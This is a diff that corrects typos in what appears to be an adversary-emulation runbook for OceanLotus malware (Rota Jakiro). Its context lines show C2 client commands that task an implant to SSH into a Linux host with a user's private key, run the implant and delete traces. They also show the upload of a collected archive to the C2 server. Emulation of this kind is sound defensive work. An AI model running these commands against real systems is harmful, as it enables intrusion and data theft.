@@ -480,7 +480,7 @@ Execute Rota Jakiro
     ```
     End Troubleshooting
    
-   End troupble shooting
+   End Troubleshooting
 
     ---
     
@@ -509,7 +509,7 @@ Execute Rota Jakiro
    [SUCCESS] 2023/08/24 19:29:52 Successfully set task output.
    ```
    
-1. Use OceanLotus to Execute Rota Jakiro on the Lotus host using ssh & confirm registration. 
+1. Use OceanLotus to Execute Rota Jakiro on the Linux host using ssh & confirm registration. 
    ```
    ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ssh -i /Users/hpotter/.ssh/id_rsa -t hpotter@viserion.com@10.90.30.7 \"nohup /tmp/rota&2>/dev/null; sleep 5; pkill rota;rm nohup.out\""}'                                         
    ```
@@ -561,11 +561,11 @@ Execute Rota Jakiro
 ## Step 4 - Discovery on Linux Host
 ### 📖 Overview
 
-Step 4 emulates OceanLotus executing a shared object that conducts System information dicovery using the `uname` syscall. 
+Step 4 emulates OceanLotus executing a shared object that conducts System information discovery using the `uname` syscall. 
 
 The following information is collected. 
 - Host name 
-- Archetecture
+- Architecture
 - Kernel version 
 
 ---
@@ -720,7 +720,7 @@ Rota Jakiro confirms the target file were created
    [INFO] 2023/08/21 19:39:14 Sending new task to implant: 01020304
    [SUCCESS] 2023/08/21 19:39:14 File uploaded: Successfully uploaded file to control server at './files/rota.tar.gz'
    ```
-1. Viefity on the C2 server that the `rota.tar.gz` is uploaded to the `/files` folder.
+1. Verify on the C2 server that the `rota.tar.gz` is uploaded to the `/files` folder.
    ```
    ls -lart ./files
    ```
